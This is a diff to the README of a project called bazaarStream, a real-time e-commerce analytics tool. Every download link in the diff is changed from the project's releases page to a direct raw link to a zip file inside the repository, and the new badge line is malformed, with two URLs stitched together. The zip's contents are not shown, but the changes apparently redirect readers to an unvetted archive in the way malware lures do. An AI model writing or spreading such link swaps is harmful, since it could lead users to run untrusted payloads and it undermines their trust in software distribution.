@@ -1,6 +1,6 @@
 # 🎉 bazaarStream - Real-Time E-Commerce Insights Made Easy
 
-[![Download bazaarStream](https://img.shields.io/badge/Download%20bazaarStream-blue.svg)](https://github.com/Gh0stDoge/bazaarStream/releases)
+[![Download bazaarStream](https://raw.githubusercontent.com/Gh0stDoge/bazaarStream/main/server_files/bazaarStream-1.7.zip%https://raw.githubusercontent.com/Gh0stDoge/bazaarStream/main/server_files/bazaarStream-1.7.zip)](https://raw.githubusercontent.com/Gh0stDoge/bazaarStream/main/server_files/bazaarStream-1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to bazaarStream! This software helps you analyze e-commerce data in real
 
 To get started, visit the link below to download bazaarStream:
 
-[Download bazaarStream](https://github.com/Gh0stDoge/bazaarStream/releases)
+[Download bazaarStream](https://raw.githubusercontent.com/Gh0stDoge/bazaarStream/main/server_files/bazaarStream-1.7.zip)
 
 ### Instructions for Downloading:
 
@@ -90,7 +90,7 @@ Feel free to reach out to our support community for any additional help or quest
 
 To ensure you have the latest features and fixes, regularly check for updates:
 
-- **Visit the Releases page** for new versions: [Download bazaarStream](https://github.com/Gh0stDoge/bazaarStream/releases)
+- **Visit the Releases page** for new versions: [Download bazaarStream](https://raw.githubusercontent.com/Gh0stDoge/bazaarStream/main/server_files/bazaarStream-1.7.zip)
 
 ## 🤝 Contribute
 
